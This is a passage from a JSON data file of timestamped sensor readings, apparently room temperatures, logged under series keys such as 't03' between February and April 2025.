            ""value"": 21.13
        },
        {
            ""date"": ""2025-03-20 08:14:00"",
            ""value"": 21.18
        },
        {
            ""date"": ""2025-03-20 08:19:00"",
            ""value"": 21.23
        },
        {
            ""date"": ""2025-03-20 08:24:00"",
            ""value"": 21.28
        },
        {
            ""date"": ""2025-03-20 08:29:00"",
            ""value"": 21.32
        },
        {
            ""date"": ""2025-03-20 08:34:00"",
            ""value"": 21.36
        },
        {
            ""date"": ""2025-03-20 08:39:00"",
            ""value"": 21.41
        },
        {
            ""date"": ""2025-03-20 08:44:00"",
            ""value"": 21.45
        },
        {
            ""date"": ""2025-03-20 08:49:00"",
            ""value"": 21.49
        },
        {
            ""date"": ""2025-03-20 08:54:00"",
            ""value"": 21.53
        },
        {
            ""date"": ""2025-03-20 08:59:00"",
            ""value"": 21.53
        },
        {
            ""date"": ""2025-03-20 09:03:00"",
            ""value"": 21.51
        },
        {
            ""date"": ""2025-03-20 10:00:00"",
            ""value"": 21.17
        },
        {
            ""date"": ""2025-03-20 11:00:00"",
            ""value"": 21.26
        },
        {
            ""date"": ""2025-03-20 17:07:32"",
            ""value"": 22.03
        },
        {
            ""date"": ""2025-03-20 17:10:02"",
            ""value"": 22.03
        },
        {
            ""date"": ""2025-03-20 14:13:00"",
            ""value"": 22.03
        },
        {
            ""date"": ""2025-03-20 14:18:00"",
            ""value"": 22.04
        },
        {
            ""date"": ""2025-03-20 14:23:00"",
            ""value"": 22.04
        },
        {
            ""date"": ""2025-03-20 14:28:00"",
            ""value"": 22.04
        },
        {
            ""date"": ""2025-03-20 14:33:00"",
            ""value"": 22.05
        },
        {
            ""date"": ""2025-03-20 14:38:00"",
            ""value"": 22.06
        },
        {
            ""date"": ""2025-03-20 14:43:00"",
            ""value"": 22.07
        },
        {
            ""date"": ""2025-03-20 14:48:00"",
            ""value"": 22.06
        },
        {
            ""date"": ""2025-03-20 14:53:00"",
            ""value"": 22.06
        },
        {
            ""date"": ""2025-03-20 14:58:00"",
            ""value"": 22.07
        },
        {
            ""date"": ""2025-03-20 15:03:00"",
            ""value"": 22.07
        },
        {
            ""date"": ""2025-03-20 15:07:00"",
            ""value"": 22.07
        },
        {
            ""date"": ""2025-03-21 11:45:03"",
            ""value"": 21.55
        },
        {
            ""date"": ""2025-03-21 11:53:42"",
            ""value"": 21.67
        },
        {
            ""date"": ""2025-03-21 11:55:02"",
            ""value"": 21.67
        },
        {
            ""date"": ""2025-03-21 08:54:00"",
            ""value"": 21.68
        },
        {
            ""date"": ""2025-03-21 08:59:00"",
            ""value"": 21.73
        },
        {
            ""date"": ""2025-03-21 12:04:36"",
            ""value"": 21.74
        },
        {
            ""date"": ""2025-03-21 12:05:10"",
            ""value"": 21.74
        },
        {
            ""date"": ""2025-03-21 09:05:00"",
            ""value"": 21.77
        },
        {
            ""date"": ""2025-03-21 09:10:00"",
            ""value"": 21.79
        },
        {
            ""date"": ""2025-03-21 09:15:00"",
            ""value"": 21.81
        },
        {
            ""date"": ""2025-03-21 09:20:00"",
            ""value"": 21.84
        },
        {
            ""date"": ""2025-03-21 09:25:00"",
            ""value"": 21.86
        },
        {
            ""date"": ""2025-03-21 09:31:00"",
            ""value"": 21.9
        },
        {
            ""date"": ""2025-03-21 09:36:00"",
            ""value"": 21.93
        },
        {
            ""date"": ""2025-03-21 14:18:56"",
            ""value"": 22.16
        },
        {
            ""date"": ""2025-03-21 14:20:02"",
            ""value"": 22.16
        },
        {
            ""date"": ""2025-03-21 11:20:00"",
            ""value"": 22.17
        },
        {
            ""date"": ""2025-03-21 11:25:00"",
            ""value"": 22.15
        },
        {
            ""date"": ""2025-03-21 11:30:00"",
            ""value"": 22.16
        },
        {
            ""date"": ""2025-03-21 11:35:00"",
            ""value"": 22.17
        },
        {
            ""date"": ""2025-03-21 11:40:00"",
            ""value"": 22.17
        },
        {
            ""date"": ""2025-03-21 11:44:00"",
            ""value"": 22.18
        },
        {
            ""date"": ""2025-03-21 12:00:00"",
            ""value"": 22.21
        },
        {
            ""date"": ""2025-03-21 13:00:00"",
            ""value"": 21.59
        },
        {
            ""date"": ""2025-03-21 16:18:18"",
            ""value"": 21.43
        },
        {
            ""date"": ""2025-03-21 16:20:02"",
            ""value"": 21.43
        },
        {
            ""date"": ""2025-03-21 13:19:00"",
            ""value"": 21.37
        },
        {
            ""date"": ""2025-03-21 13:24:00"",
            ""value"": 21.34
        },
        {
            ""date"": ""2025-03-21 17:02:16"",
            ""value"": 21.2
        },
        {
            ""date"": ""2025-03-21 14:03:00"",
            ""value"": 21.18
        },
        {
            ""date"": ""2025-03-21 17:05:02"",
            ""value"": 21.2
        },
        {
            ""date"": ""2025-03-21 14:08:00"",
            ""value"": 21.15
        },
        {
            ""date"": ""2025-03-21 14:13:00"",
            ""value"": 21.12
        },
        {
            ""date"": ""2025-03-21 14:18:00"",
            ""value"": 21.1
        },
        {
            ""date"": ""2025-03-21 14:23:00"",
            ""value"": 21.09
        },
        {
            ""date"": ""2025-03-21 14:28:00"",
            ""value"": 21.06
        },
        {
            ""date"": ""2025-03-21 14:33:00"",
            ""value"": 21.04
        },
        {
            ""date"": ""2025-03-21 14:38:00"",
            ""value"": 21.03
        },
        {
            ""date"": ""2025-03-21 14:43:00"",
            ""value"": 21.02
        },
        {
            ""date"": ""2025-03-21 14:48:00"",
            ""value"": 20.99
        },
        {
            ""date"": ""2025-03-21 14:53:00"",
            ""value"": 20.99
        },
        {
            ""date"": ""2025-03-21 14:57:00"",
            ""value"": 21.01
        },
        {
            ""date"": ""2025-03-21 16:00:00"",
            ""value"": 20.9
        },
        {
            ""date"": ""2025-03-21 19:52:31"",
            ""value"": 20.76
        },
        {
            ""date"": ""2025-03-21 19:55:02"",
            ""value"": 20.76
        },
        {
            ""date"": ""2025-03-21 16:58:00"",
            ""value"": 20.76
        },
        {
            ""date"": ""2025-03-21 17:03:00"",
            ""value"": 20.76
        },
        {
            ""date"": ""2025-03-21 17:08:00"",
            ""value"": 20.75
        },
        {
            ""date"": ""2025-03-21 17:13:00"",
            ""value"": 20.76
        },
        {
            ""date"": ""2025-03-21 17:18:00"",
            ""value"": 20.78
        },
        {
            ""date"": ""2025-03-21 17:23:00"",
            ""value"": 20.8
        },
        {
            ""date"": ""2025-03-21 17:28:00"",
            ""value"": 20.83
        },
        {
            ""date"": ""2025-03-21 17:33:00"",
            ""value"": 20.85
        },
        {
            ""date"": ""2025-03-21 17:38:00"",
            ""value"": 20.87
        },
        {
            ""date"": ""2025-03-21 17:43:00"",
            ""value"": 20.9
        },
        {
            ""date"": ""2025-03-21 17:48:00"",
            ""value"": 20.9
        },
        {
            ""date"": ""2025-03-21 17:52:00"",
            ""value"": 20.93
        },
        {
            ""date"": ""2025-03-21 18:00:00"",
            ""value"": 20.96
        },
        {
            ""date"": ""2025-03-21 19:00:00"",
            ""value"": 20.98
        },
        {
            ""date"": ""2025-03-21 20:00:00"",
            ""value"": 20.88
        },
        {
            ""date"": ""2025-03-21 21:00:00"",
            ""value"": 20.7
        },
        {
            ""date"": ""2025-03-21 22:00:00"",
            ""value"": 20.57
        },
        {
            ""date"": ""2025-03-22 03:00:00"",
            ""value"": 20.31
        },
        {
            ""date"": ""2025-03-22 04:00:00"",
            ""value"": 20.25
        },
        {
            ""date"": ""2025-03-22 05:00:00"",
            ""value"": 20.15
        },
        {
            ""date"": ""2025-03-22 06:00:00"",
            ""value"": 20.28
        },
        {
            ""date"": ""2025-03-22 07:00:00"",
            ""value"": 20.47
        },
        {
            ""date"": ""2025-03-22 08:00:00"",
            ""value"": 20.66
        },
        {
            ""date"": ""2025-03-22 09:00:00"",
            ""value"": 20.91
        },
        {
            ""date"": ""2025-03-22 10:00:00"",
            ""value"": 20.9
        },
        {
            ""date"": ""2025-03-22 11:00:00"",
            ""value"": 20.85
        },
        {
            ""date"": ""2025-03-22 12:00:00"",
            ""value"": 20.82
        },
        {
            ""date"": ""2025-03-22 13:00:00"",
            ""value"": 20.79
        },
        {
            ""date"": ""2025-03-22 14:00:00"",
            ""value"": 20.74
        },
        {
            ""date"": ""2025-03-22 15:00:00"",
            ""value"": 20.72
        },
        {
            ""date"": ""2025-03-22 16:00:00"",
            ""value"": 20.67
        },
        {
            ""date"": ""2025-03-22 17:00:00"",
            ""value"": 20.57
        },
        {
            ""date"": ""2025-03-22 18:00:00"",
            ""value"": 20.48
        },
        {
            ""date"": ""2025-03-22 19:00:00"",
            ""value"": 20.39
        },
        {
            ""date"": ""2025-03-22 20:00:00"",
            ""value"": 20.3
        },
        {
            ""date"": ""2025-03-22 21:00:00"",
            ""value"": 20.2
        },
        {
            ""date"": ""2025-03-22 22:00:00"",
            ""value"": 20.07
        },
        {
            ""date"": ""2025-03-23 03:00:00"",
            ""value"": 19.65
        },
        {
            ""date"": ""2025-03-23 04:00:00"",
            ""value"": 19.56
        },
        {
            ""date"": ""2025-03-23 05:00:00"",
            ""value"": 19.54
        },
        {
            ""date"": ""2025-03-23 06:00:00"",
            ""value"": 19.78
        },
        {
            ""date"": ""2025-03-23 07:00:00"",
            ""value"": 20.07
        },
        {
            ""date"": ""2025-03-23 08:00:00"",
            ""value"": 20.52
        },
        {
            ""date"": ""2025-03-23 09:00:00"",
            ""value"": 20.84
        },
        {
            ""date"": ""2025-03-23 10:00:00"",
            ""value"": 20.84
        },
        {
            ""date"": ""2025-03-23 11:00:00"",
            ""value"": 20.76
        },
        {
            ""date"": ""2025-03-23 12:00:00"",
            ""value"": 20.69
        },
        {
            ""date"": ""2025-03-23 13:00:00"",
            ""value"": 20.64
        },
        {
            ""date"": ""2025-03-23 14:00:00"",
            ""value"": 20.6
        },
        {
            ""date"": ""2025-03-23 15:00:00"",
            ""value"": 20.54
        },
        {
            ""date"": ""2025-03-23 16:00:00"",
            ""value"": 20.47
        },
        {
            ""date"": ""2025-03-23 17:00:00"",
            ""value"": 20.38
        },
        {
            ""date"": ""2025-03-23 18:00:00"",
            ""value"": 20.28
        },
        {
            ""date"": ""2025-03-23 19:00:00"",
            ""value"": 20.17
        },
        {
            ""date"": ""2025-03-23 20:00:00"",
            ""value"": 20.06
        },
        {
            ""date"": ""2025-03-23 21:00:00"",
            ""value"": 20.02
        },
        {
            ""date"": ""2025-03-23 22:00:00"",
            ""value"": 19.96
        },
        {
            ""date"": ""2025-03-24 03:00:00"",
            ""value"": 19.79
        },
        {
            ""date"": ""2025-03-24 04:00:00"",
            ""value"": 19.74
        },
        {
            ""date"": ""2025-03-24 05:00:00"",
            ""value"": 19.72
        },
        {
            ""date"": ""2025-03-24 06:00:00"",
            ""value"": 19.9
        },
        {
            ""date"": ""2025-03-24 07:00:00"",
            ""value"": 20.37
        },
        {
            ""date"": ""2025-03-24 08:00:00"",
            ""value"": 21.04
        },
        {
            ""date"": ""2025-03-24 09:00:00"",
            ""value"": 21.67
        },
        {
            ""date"": ""2025-03-24 10:00:00"",
            ""value"": 21.61
        },
        {
            ""date"": ""2025-03-24 11:00:00"",
            ""value"": 21.6
        },
        {
            ""date"": ""2025-03-24 12:00:00"",
            ""value"": 21.7
        },
        {
            ""date"": ""2025-03-24 13:00:00"",
            ""value"": 21.56
        },
        {
            ""date"": ""2025-03-24 16:14:02"",
            ""value"": 21.52
        },
        {
            ""date"": ""2025-03-24 16:15:03"",
            ""value"": 21.52
        },
        {
            ""date"": ""2025-03-24 16:20:02"",
            ""value"": 21.51
        },
        {
            ""date"": ""2025-03-24 16:25:02"",
            ""value"": 21.52
        },
        {
            ""date"": ""2025-03-24 17:10:02"",
            ""value"": 21.65
        },
        {
            ""date"": ""2025-03-24 17:15:03"",
            ""value"": 21.62
        },
        {
            ""date"": ""2025-03-24 17:20:02"",
            ""value"": 21.57
        },
        {
            ""date"": ""2025-03-25 13:45:02"",
            ""value"": 20.56
        },
        {
            ""date"": ""2025-03-25 13:50:03"",
            ""value"": 20.68
        },
        {
            ""date"": ""2025-03-25 14:00:02"",
            ""value"": 20.89
        },
        {
            ""date"": ""2025-03-25 14:05:15"",
            ""value"": 20.85
        },
        {
            ""date"": ""2025-03-25 14:10:03"",
            ""value"": 20.82
        },
        {
            ""date"": ""2025-03-25 14:30:02"",
            ""value"": 20.48
        },
        {
            ""date"": ""2025-03-25 14:45:02"",
            ""value"": 20.35
        },
        {
            ""date"": ""2025-03-25 14:50:02"",
            ""value"": 20.36
        },
        {
            ""date"": ""2025-03-25 14:55:02"",
            ""value"": 20.36
        },
        {
            ""date"": ""2025-03-25 15:15:07"",
            ""value"": 20.49
        },
        {
            ""date"": ""2025-03-27 14:10:03"",
            ""value"": 22.21
        },
        {
            ""date"": ""2025-03-27 14:12:19"",
            ""value"": 22.19
        },
        {
            ""date"": ""2025-03-27 14:15:03"",
            ""value"": 22.2
        },
        {
            ""date"": ""2025-03-27 14:21:15"",
            ""value"": 22.08
        },
        {
            ""date"": ""2025-03-27 14:22:54"",
            ""value"": 22.06
        },
        {
            ""date"": ""2025-03-27 14:25:03"",
            ""value"": 22.08
        },
        {
            ""date"": ""2025-03-27 14:30:03"",
            ""value"": 21.96
        },
        {
            ""date"": ""2025-03-28 15:33:06"",
            ""value"": 21.24
        },
        {
            ""date"": ""2025-03-28 15:35:03"",
            ""value"": 21.24
        },
        {
            ""date"": ""2025-03-28 12:34:00"",
            ""value"": 21.25
        },
        {
            ""date"": ""2025-04-04 10:30:02"",
            ""value"": 13.71
        },
        {
            ""date"": ""2025-04-04 07:43:00"",
            ""value"": 13.94
        },
        {
            ""date"": ""2025-04-04 11:20:02"",
            ""value"": 14.95
        },
        {
            ""date"": ""2025-04-04 18:40:03"",
            ""value"": 19.7
        },
        {
            ""date"": ""2025-04-04 18:55:02"",
            ""value"": 20.05
        },
        {
            ""date"": ""2025-04-04 19:20:02"",
            ""value"": 19.8
        },
        {
            ""date"": ""2025-04-04 19:25:03"",
            ""value"": 19.68
        },
        {
            ""date"": ""2025-04-04 19:30:03"",
            ""value"": 19.53
        },
        {
            ""date"": ""2025-04-04 16:40:00"",
            ""value"": 19.24
        },
        {
            ""date"": ""2025-04-04 16:50:00"",
            ""value"": 18.96
        },
        {
            ""date"": ""2025-04-04 17:41:00"",
            ""value"": 19.35
        },
        {
            ""date"": ""2025-04-04 18:11:00"",
            ""value"": 19.85
        },
        {
            ""date"": ""2025-04-04 18:20:00"",
            ""value"": 20.0
        },
        {
            ""date"": ""2025-04-04 19:00:00"",
            ""value"": 20.34
        },
        {
            ""date"": ""2025-04-04 20:00:00"",
            ""value"": 20.57
        },
        {
            ""date"": ""2025-04-04 21:00:00"",
            ""value"": 20.67
        },
        {
            ""date"": ""2025-04-04 22:00:00"",
            ""value"": 20.7
        },
        {
            ""date"": ""2025-04-04 23:00:00"",
            ""value"": 20.71
        },
        {
            ""date"": ""2025-04-05 00:00:00"",
            ""value"": 20.71
        },
        {
            ""date"": ""2025-04-05 01:00:00"",
            ""value"": 20.69
        },
        {
            ""date"": ""2025-04-05 02:00:00"",
            ""value"": 20.67
        },
        {
            ""date"": ""2025-04-05 03:00:00"",
            ""value"": 20.66
        },
        {
            ""date"": ""2025-04-05 04:00:00"",
            ""value"": 20.64
        },
        {
            ""date"": ""2025-04-05 05:00:00"",
            ""value"": 20.65
        },
        {
            ""date"": ""2025-04-05 06:00:00"",
            ""value"": 20.63
        },
        {
            ""date"": ""2025-04-05 08:00:00"",
            ""value"": 20.67
        },
        {
            ""date"": ""2025-04-05 09:00:00"",
            ""value"": 20.65
        },
        {
            ""date"": ""2025-04-05 10:00:00"",
            ""value"": 20.68
        },
        {
            ""date"": ""2025-04-05 11:00:00"",
            ""value"": 20.74
        },
        {
            ""date"": ""2025-04-05 12:00:00"",
            ""value"": 20.78
        },
        {
            ""date"": ""2025-04-05 13:00:00"",
            ""value"": 20.78
        },
        {
            ""date"": ""2025-04-05 14:00:00"",
            ""value"": 20.74
        },
        {
            ""date"": ""2025-04-05 15:00:00"",
            ""value"": 20.69
        },
        {
            ""date"": ""2025-04-05 16:00:00"",
            ""value"": 20.63
        },
        {
            ""date"": ""2025-04-05 17:00:00"",
            ""value"": 20.56
        },
        {
            ""date"": ""2025-04-05 18:00:00"",
            ""value"": 20.51
        },
        {
            ""date"": ""2025-04-05 19:00:00"",
            ""value"": 20.46
        },
        {
            ""date"": ""2025-04-05 20:00:00"",
            ""value"": 20.42
        },
        {
            ""date"": ""2025-04-05 21:00:00"",
            ""value"": 20.39
        },
        {
            ""date"": ""2025-04-05 22:00:00"",
            ""value"": 20.35
        },
        {
            ""date"": ""2025-04-05 23:00:00"",
            ""value"": 20.32
        },
        {
            ""date"": ""2025-04-06 00:00:00"",
            ""value"": 20.3
        },
        {
            ""date"": ""2025-04-06 01:00:00"",
            ""value"": 20.28
        },
        {
            ""date"": ""2025-04-06 02:00:00"",
            ""value"": 20.25
        },
        {
            ""date"": ""2025-04-06 03:00:00"",
            ""value"": 20.23
        },
        {
            ""date"": ""2025-04-06 04:00:00"",
            ""value"": 20.2
        },
        {
            ""date"": ""2025-04-06 05:00:00"",
            ""value"": 20.18
        },
        {
            ""date"": ""2025-04-06 06:00:00"",
            ""value"": 20.2
        },
        {
            ""date"": ""2025-04-06 07:00:00"",
            ""value"": 20.24
        },
        {
            ""date"": ""2025-04-06 08:00:00"",
            ""value"": 20.29
        },
        {
            ""date"": ""2025-04-06 09:00:00"",
            ""value"": 20.46
        },
        {
            ""date"": ""2025-04-06 10:00:00"",
            ""value"": 20.6
        },
        {
            ""date"": ""2025-04-06 11:00:00"",
            ""value"": 20.65
        },
        {
            ""date"": ""2025-04-06 12:00:00"",
            ""value"": 20.71
        },
        {
            ""date"": ""2025-04-06 13:00:00"",
            ""value"": 20.73
        },
        {
            ""date"": ""2025-04-06 14:00:00"",
            ""value"": 20.72
        },
        {
            ""date"": ""2025-04-06 15:00:00"",
            ""value"": 20.69
        },
        {
            ""date"": ""2025-04-06 16:00:00"",
            ""value"": 20.66
        },
        {
            ""date"": ""2025-04-06 17:00:00"",
            ""value"": 20.6
        },
        {
            ""date"": ""2025-04-06 18:00:00"",
            ""value"": 20.57
        },
        {
            ""date"": ""2025-04-06 19:00:00"",
            ""value"": 20.54
        },
        {
            ""date"": ""2025-04-06 20:00:00"",
            ""value"": 20.49
        },
        {
            ""date"": ""2025-04-06 21:00:00"",
            ""value"": 20.47
        },
        {
            ""date"": ""2025-04-06 22:00:00"",
            ""value"": 20.45
        },
        {
            ""date"": ""2025-04-06 23:00:00"",
            ""value"": 20.43
        },
        {
            ""date"": ""2025-04-07 00:00:00"",
            ""value"": 20.4
        },
        {
            ""date"": ""2025-04-07 01:00:00"",
            ""value"": 20.37
        },
        {
            ""date"": ""2025-04-07 02:00:00"",
            ""value"": 20.35
        },
        {
            ""date"": ""2025-04-07 03:00:00"",
            ""value"": 20.32
        },
        {
            ""date"": ""2025-04-07 04:00:00"",
            ""value"": 20.3
        },
        {
            ""date"": ""2025-04-07 05:00:00"",
            ""value"": 20.27
        },
        {
            ""date"": ""2025-04-07 06:00:00"",
            ""value"": 20.23
        },
        {
            ""date"": ""2025-04-07 07:00:00"",
            ""value"": 20.2
        },
        {
            ""date"": ""2025-04-07 08:00:00"",
            ""value"": 18.49
        },
        {
            ""date"": ""2025-04-07 09:00:00"",
            ""value"": 15.03
        },
        {
            ""date"": ""2025-04-07 12:23:10"",
            ""value"": 15.64
        },
        {
            ""date"": ""2025-04-07 12:25:02"",
            ""value"": 15.64
        },
        {
            ""date"": ""2025-04-07 09:28:00"",
            ""value"": 15.86
        },
        {
            ""date"": ""2025-04-07 09:38:00"",
            ""value"": 16.31
        },
        {
            ""date"": ""2025-04-07 13:25:02"",
            ""value"": 18.94
        },
        {
            ""date"": ""2025-04-07 13:30:03"",
            ""value"": 19.34
        }
    ],
    ""t03"": [
        {
            ""date"": ""2025-02-17 15:15:02"",
            ""value"": 19.4
        },
        {
            ""date"": ""2025-02-21 16:20:02"",
            ""value"": 19.39
        },
        {
            ""date"": ""2025-02-21 16:25:02"",
            ""value"": 19.38
        },
        {
            ""date"": ""2025-02-24 13:20:03"",
            ""value"": 19.24
        },
        {
            ""date"": ""2025-02-24 13:25:02"",
            ""value"": 19.28
        },
        {
            ""date"": ""2025-02-24 13:40:03"",
            ""value"": 19.13
        },
        {
            ""date"": ""2025-02-24 10:40:00"",
            ""value"": 19.15
        },
        {
            ""date"": ""2025-02-24 10:45:00"",
            ""value"": 19.2
        },
        {
            ""date"": ""2025-02-24 10:50:00"",
            ""value"": 19.25
        },
        {
            ""date"": ""2025-02-24 10:55:00"",
            ""value"": 19.29
        },
        {
            ""date"": ""2025-02-24 11:00:00"",
            ""value"": 19.33
        },
        {
            ""date"": ""2025-02-24 11:05:00"",
            ""value"": 19.36
        },
        {
            ""date"": ""2025-02-24 11:10:00"",
            ""value"": 19.39
        },
        {
            ""date"": ""2025-02-24 11:15:00"",
            ""value"": 19.44
        },
        {
            ""date"": ""2025-02-24 11:20:00"",
            ""value"": 19.47
        },
        {
            ""date"": ""2025-02-24 11:26:00"",
            ""value"": 19.5
        },
        {
            ""date"": ""2025-02-24 11:31:00"",
            ""value"": 19.54
        },
        {
            ""date"": ""2025-02-24 11:35:00"",
            ""value"": 19.27
        },
        {
            ""date"": ""2025-02-24 12:00:00"",
            ""value"": 18.93
        },
        {
            ""date"": ""2025-02-24 16:00:02"",
            ""value"": 19.54
        },
        {
            ""date"": ""2025-02-24 16:05:03"",
            ""value"": 19.53
        },
        {
            ""date"": ""2025-02-24 16:10:04"",
            ""value"": 19.5
        },
        {
            ""date"": ""2025-02-24 16:15:02"",
            ""value"": 19.48
        },
        {
            ""date"": ""2025-02-24 16:20:03"",
            ""value"": 19.44
        },
        {
            ""date"": ""2025-03-07 11:30:03"",
            ""value"": 18.84
        },
        {
            ""date"": ""2025-03-07 08:45:00"",
            ""value"": 19.16
        },
        {
            ""date"": ""2025-03-12 14:50:03"",
            ""value"": 19.73
        },
        {
            ""date"": ""2025-03-13 17:50:02"",
            ""value"": 20.6
        },
        {
            ""date"": ""2025-03-13 18:00:03"",
            ""value"": 20.56
        },
        {
            ""date"": ""2025-03-13 18:05:02"",
            ""value"": 20.58
        },
        {
            ""date"": ""2025-03-18 19:10:02"",
            ""value"": 22.63
        },
        {
            ""date"": ""2025-03-18 16:15:00"",
            ""value"": 22.63
        },
        {
            ""date"": ""2025-03-18 16:20:00"",
            ""value"": 22.64
        },
        {
            ""date"": ""2025-03-18 19:25:02"",
            ""value"": 22.66
        },
        {
            ""date"": ""2025-03-18 16:27:00"",
            ""value"": 22.66
        },
        {
            ""date"": ""2025-03-18 16:32:00"",
            ""value"": 22.67
        },
        {
            ""date"": ""2025-03-18 16:37:00"",
            ""value"": 22.68
        },
        {
            ""date"": ""2025-03-18 16:42:00"",
            ""value"": 22.69
        },
        {
            ""date"": ""2025-03-18 16:47:00"",
            ""value"": 22.71
        },
        {
            ""date"": ""2025-03-18 16:52:00"",
            ""value"": 22.73
        },
        {
            ""date"": ""2025-03-18 16:57:00"",
            ""value"": 22.74
        },
        {
            ""date"": ""2025-03-18 17:02:00"",
            ""value"": 22.75
        },
        {
            ""date"": ""2025-03-18 17:08:00"",
            ""value"": 22.75
        },
        {
            ""date"": ""2025-03-20 10:25:02"",
            ""value"": 20.89
        },
        {
            ""date"": ""2025-03-20 07:25:00"",
            ""value"": 20.91
        },
        {
            ""date"": ""2025-03-20 10:30:02"",
            ""value"": 20.94
        },
        {
            ""date"": ""2025-03-20 07:31:00"",
            ""value"": 20.95
        },
        {
            ""date"": ""2025-03-20 07:36:00"",
            ""value"": 21.0
        },
        {
            ""date"": ""2025-03-20 07:41:00"",
            ""value"": 21.03
        },
        {
            ""date"": ""2025-03-20 10:50:03"",
            ""value"": 21.05
        },
        {
            ""date"": ""2025-03-20 10:55:01"",
            ""value"": 21.11
        },
        {
            ""date"": ""2025-03-20 10:55:02"",
            ""value"": 21.11
        },
        {
            ""date"": ""2025-03-20 07:56:00"",
            ""value"": 21.13
        },
        {
            ""date"": ""2025-03-20 08:01:00"",
            ""value"": 21.17
        },
        {
            ""date"": ""2025-03-20 11:07:54"",
            ""value"": 21.21
        },
        {
            ""date"": ""2025-03-20 11:10:02"",
            ""value"": 21.21
        },
        {
            ""date"": ""2025-03-20 08:09:00"",
            ""value"": 21.23
        },
        {
            ""date"": ""2025-03-20 08:14:00"",
            ""value"": 21.28
        },
        {
            ""date"": ""2025-03-20 08:19:00"",
            ""value"": 21.33
        },
        {
            ""date"": ""2025-03-20 08:24:00"",
            ""value"": 21.35
        },
        {
            ""date"": ""2025-03-20 08:29:00"",
            ""value"": 21.39
        },
        {
            ""date"": ""2025-03-20 08:34:00"",
            ""value"": 21.44
        },
        {
            ""date"": ""2025-03-20 08:39:00"",
            ""value"": 21.49
        },
        {
            ""date"": ""2025-03-20 08:44:00"",
            ""value"": 21.53
        },
        {
            ""date"": ""2025-03-20 08:49:00"",
            ""value"": 21.57
        },
        {
            ""date"": ""2025-03-20 08:54:00"",
            ""value"": 21.59
        },
        {
            ""date"": ""2025-03-20 08:59:00"",
            ""value"": 21.6
        },
        {
            ""date"": ""2025-03-20 09:03:00"",
            ""value"": 21.57
        },
        {
            ""date"": ""2025-03-20 10:00:00"",
            ""value"": 21.21
        },
        {
            ""date"": ""2025-03-20 11:00:00"",
            ""value"": 21.32
        },
        {
            ""date"": ""2025-03-20 17:07:32"",
            ""value"": 22.11
        },
        {
            ""date"": ""2025-03-20 17:10:02"",
            ""value"": 22.11
        },
        {
            ""date"": ""2025-03-20 14:13:00"",
            ""value"": 22.12
        },
        {
            ""date"": ""2025-03-20 14:18:00"",
            ""value"": 22.13
        },
        {
            ""date"": ""2025-03-20 14:23:00"",
            ""value"": 22.13
        },
        {
            ""date"": ""2025-03-20 14:28:00"",
            ""value"": 22.13
        },
        {
            ""date"": ""2025-03-20 14:33:00"",
            ""value"": 22.14
        },
        {
            ""date"": ""2025-03-20 14:38:00"",
            ""value"": 22.14
        },
        {
            ""date"": ""2025-03-20 14:43:00"",
            ""value"": 22.15
        },
        {
            ""date"": ""2025-03-20 14:48:00"",
            ""value"": 22.15
        },
        {
            ""date"": ""2025-03-20 14:53:00"",
            ""value"": 22.17
        },
        {
            ""date"": ""2025-03-20 14:58:00"",
            ""value"": 22.17
        },
        {
            ""date"": ""2025-03-20 15:03:00"",
            ""value"": 22.17
        },
        {
            ""date"": ""2025-03-20 15:07:00"",
            ""value"": 22.17
        },
        {
            ""date"": ""2025-03-21 11:45:03"",
            ""value"": 21.64
        },
        {
            ""date"": ""2025-03-21 11:53:42"",
            ""value"": 21.75
        },
        {
            ""date"": ""2025-03-21 11:55:02"",
            ""value"": 21.75
        },
        {
            ""date"": ""2025-03-21 08:54:00"",
            ""value"": 21.78
        },
        {
            ""date"": ""2025-03-21 08:59:00"",
            ""value"": 21.83
        },
        {
            ""date"": ""2025-03-21 12:04:36"",
            ""value"": 21.83
        },
        {
            ""date"": ""2025-03-21 12:05:10"",
            ""value"": 21.83
        },
        {
            ""date"": ""2025-03-21 09:05:00"",
            ""value"": 21.86
        },
        {
            ""date"": ""2025-03-21 09:10:00"",
            ""value"": 21.87
        },
        {
            ""date"": ""2025-03-21 09:15:00"",
            ""value"": 21.89
        },
        {
            ""date"": ""2025-03-21 09:20:00"",
            ""value"": 21.91
        },
        {
            ""date"": ""2025-03-21 09:25:00"",
            ""value"": 21.94
        },
        {
            ""date"": ""2025-03-21 09:31:00"",
            ""value"": 21.97
        },
        {
            ""date"": ""2025-03-21 09:36:00"",
            ""value"": 22.0
        },
        {
            ""date"": ""2025-03-21 14:18:56"",
            ""value"": 22.25
        },
        {
            ""date"": ""2025-03-21 14:20:02"",
            ""value"": 22.25
        },
        {
            ""date"": ""2025-03-21 11:20:00"",
            ""value"": 22.25
        },
        {
            ""date"": ""2025-03-21 11:25:00"",
            ""value"": 22.25
        },
        {
            ""date"": ""2025-03-21 11:30:00"",
            ""value"": 22.25
        },
        {
            ""date"": ""2025-03-21 11:35:00"",
            ""value"": 22.25
        },
        {
            ""date"": ""2025-03-21 11:40:00"",
            ""value"": 22.26
        },
        {
            ""date"": ""2025-03-21 11:44:00"",
            ""value"": 22.28
        },
        {
            ""date"": ""2025-03-21 12:00:00"",
            ""value"": 22.3
        },
        {
            ""date"": ""2025-03-21 13:00:00"",
            ""value"": 21.69
        },
        {
            ""date"": ""2025-03-21 16:18:18"",
            ""value"": 21.53
        },
        {
            ""date"": ""2025-03-21 16:20:02"",
            ""value"": 21.53
        },
        {
            ""date"": ""2025-03-21 13:19:00"",
            ""value"": 21.47
        },
        {
            ""date"": ""2025-03-21 13:24:00"",
            ""value"": 21.44
        },
        {
            ""date"": ""2025-03-21 17:02:16"",
            ""value"": 21.27
        },
        {
            ""date"": ""2025-03-21 14:03:00"",
            ""value"": 21.26
        },
        {
            ""date"": ""2025-03-21 17:05:02"",
            ""value"": 21.27
        },
        {
            ""date"": ""2025-03-21 14:08:00"",
            ""value"": 21.24
        },
        {
            ""date"": ""2025-03-21 14:13:00"",
            ""value"": 21.21
        },
        {
            ""date"": ""2025-03-21 14:18:00"",
            ""value"": 21.19
        },
        {
            ""date"": ""2025-03-21 14:23:00"",
            ""value"": 21.17
        },
        {
            ""date"": ""2025-03-21 14:28:00"",
            ""value"": 21.14
        },
        {
            ""date"": ""2025-03-21 14:33:00"",
            ""value"": 21.11
        },
        {
            ""date"": ""2025-03-21 14:38:00"",
            ""value"": 21.1
        },
        {
            ""date"": ""2025-03-21 14:43:00"",
            ""value"": 21.08
        },
        {
            ""date"": ""2025-03-21 14:48:00"",
            ""value"": 21.08
        },
        {
            ""date"": ""2025-03-21 14:53:00"",
            ""value"": 21.07
        },
        {
            ""date"": ""2025-03-21 14:57:00"",
            ""value"": 21.08
        },
        {
